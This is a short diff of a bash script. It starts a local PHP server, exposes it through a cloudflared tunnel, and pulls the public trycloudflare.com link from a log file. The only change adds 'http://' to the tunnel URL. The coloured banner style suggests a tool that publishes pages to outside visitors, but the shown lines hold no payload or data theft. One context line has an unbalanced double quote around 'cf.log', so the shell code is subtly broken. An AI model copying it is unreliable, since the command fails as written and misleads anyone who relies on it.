@@ -98,7 +98,7 @@ php -S 127.0.0.1:3333 > /dev/null 2>&1 &
 sleep 2
 printf "\e[1;92m[\e[0m+\e[1;92m] Starting cloudflared tunnel...\n"
 rm cf.log > /dev/null 2>&1 &
-./cloudflared tunnel -url 127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
+./cloudflared tunnel -url http://127.0.0.1:3333 --logfile cf.log > /dev/null 2>&1 &
 sleep 15
 link=$(grep -oE 'https://[A-Za-z0-9,-]+\.trycloudflare.com' "cf.log | head -n1)
 if [[ -z "$link" ]]; then
